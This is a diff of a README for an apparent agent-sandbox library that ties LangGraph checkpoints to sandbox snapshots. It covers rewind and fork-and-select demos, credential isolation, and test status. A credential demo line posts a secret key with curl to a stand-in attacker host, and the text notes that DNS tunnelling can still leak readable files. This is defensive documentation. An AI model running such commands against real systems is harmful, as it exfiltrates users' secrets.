@@ -33,10 +33,12 @@ sandbox state move together.
   older checkpoint continues on a new sandbox forked from that snapshot.
 - **Fork-and-select**: `fork_and_select` tries N alternatives in parallel forks and keeps the
   one whose tests pass.
-- **Credentials stay out of the VM**: rules and policies for SPACE's network-layer credential
-  injection and deny-by-default egress, plus a `SecretGuard` that refuses to send host
-  secrets into the sandbox. Public DNS resolvers stay reachable (domain rules need them), so
-  DNS tunnelling can still leak files the agent can read, but never the injected credentials.
+- **Credentials stay out of the VM** *(experimental)*: rules and policies for SPACE's
+  network-layer credential injection and deny-by-default egress, plus a `SecretGuard` that
+  refuses to send host secrets into the sandbox. Public DNS resolvers stay reachable (domain
+  rules need them), so DNS tunnelling can still leak files the agent can read, but never the
+  injected credentials. Tested against mocked HTTP only: SPACE's injection needs AWS Secrets
+  Manager and AWS Private CA, so it has not run on real SPACE yet.
 
 ## Architecture
 
@@ -106,7 +108,25 @@ Outside an agent, `SpaceSandbox.create(client, "code-runtime")` is a plain backe
 
 ## Demos
 
-Both run anywhere: they use simulated sandboxes (`FakeSpaceClient`) unless you pass `--space`.
+All three run anywhere: they use simulated sandboxes (`FakeSpaceClient`) unless you pass
+`--space`. The integration workflow records the rewind demo on real SPACE as a GIF.
+
+```text
+$ uv run python examples/rewind_demo.py
+Plain sandbox backend + LangGraph checkpointer
+  step writes v1
+  step writes v2
+  step writes v3
+  rewind to the checkpoint after v1, run one more step
+  it sees "v3": WRONG, the sandbox stayed in the future
+
+langchain-space: each checkpoint bound to a SPACE snapshot
+  step writes v1
+  step writes v2
+  step writes v3
+  rewind to the checkpoint after v1, run one more step
+  it sees "v1": OK, the sandbox rewound too
+```
 
 ```text
 $ uv run python examples/fork_and_select_demo.py
@@ -137,9 +157,11 @@ $ curl -d key=sk-host-only-... https://attacker.example/collect
 ```
 
 The credential demo simulates SPACE's gateway. The real path is covered by
-`tests/integration/test_space_credentials.py`, which needs SPACE and AWS.
+`tests/integration/test_space_credentials.py`, which needs SPACE and AWS and has not run yet.
 
-<!-- TODO: demo GIF of the rewind scenario on a real SPACE deployment. -->
+<!-- TODO: add the GIF the integration workflow uploads (rewind-demo.gif in its artifact):
+     ![Rewind demo on real SPACE](docs/rewind-demo.gif) -->
+
 
 ## Benchmarks
 
@@ -177,12 +199,11 @@ with a fake whose forks share state, it reports 0/N.
 
 ## Status
 
-Runs on a live SPACE deployment (the integration workflow above, run 39745156201):
+Runs on a live SPACE deployment (the integration workflow above, run 39752644201):
 fork-and-select, the time-travel consistency tests and the benchmarks pass there. Of the
-standard `langchain-tests` sandbox suite's 86 tests, 77 pass; 7 check the pre-0.7 deepagents
-`glob`/`write` contract and are marked as expected failures (see
-`tests/integration/test_standard.py`); the 2 large `execute` output tests failed on our old
-200,000-character output cap, which now matches deepagents' 10 MiB capture limit.
+standard `langchain-tests` sandbox suite's 86 tests, 79 pass; the other 7 check the pre-0.7
+deepagents `glob`/`write` contract and are marked as expected failures (see
+`tests/integration/test_standard.py`).
 Credential injection is not verified on real infrastructure: it needs AWS Secrets Manager and
 AWS Private CA. Remaining open questions are listed in `CLAUDE.md`.
 
